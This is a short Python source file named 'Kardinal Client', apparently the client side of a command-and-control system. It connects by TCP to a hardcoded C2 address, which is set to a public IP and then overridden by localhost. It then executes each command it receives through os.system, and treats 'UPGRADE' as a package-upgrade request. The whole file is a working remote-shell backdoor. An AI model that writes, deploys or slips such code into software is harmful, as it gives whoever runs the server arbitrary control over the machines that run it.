"""

,-, ,           .           .      ,--. .            .
 )|/  ,-. ,-. ,-| . ,-. ,-. |     | `-' |  . ,-. ,-. |-
  |\  ,-| |   | | | | | ,-| |     |   . |  | |-' | | |
 ,' ` `-^ '   `-^ ' ' ' `-^ `'    `--'  `' ' `-' ' ' `'


Name: Kardinal Client
Author: K4YT3X
Date Created: Dec 2, 2017
Last Modified: Dec 2, 2017
"""
from kpm import kpm
import avalon_framework as avalon
import os
import socket
C2ADDR = "45.77.173.57"
C2ADDR = "127.0.0.1"


# -------------------------------- Classses

class sockethadler:

    def __init__(self):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.connect((C2ADDR, 10000))

    def expect_command(self):
        return self.sock.recv(1024).decode('utf-8').replace("\n", '')


class command_interpreter:

    def __init__(self):
        pass

    def process_command(self, command):
        if command == "UPGRADE":
            upgrade_packages()
        else:
            avalon.info("Command Received: {}{}".format(avalon.FG.Y, command))
            os.system(command)


# -------------------------------- Functions

def upgrade_packages():
    kobj.upgrade_all()


# -------------------------------- Procedural Code

s0 = sockethadler()
ci = command_interpreter()
kobj = kpm()

cmd = s0.expect_command()
while cmd is not None and cmd != '':
    ci.process_command(cmd)
    cmd = s0.expect_command()
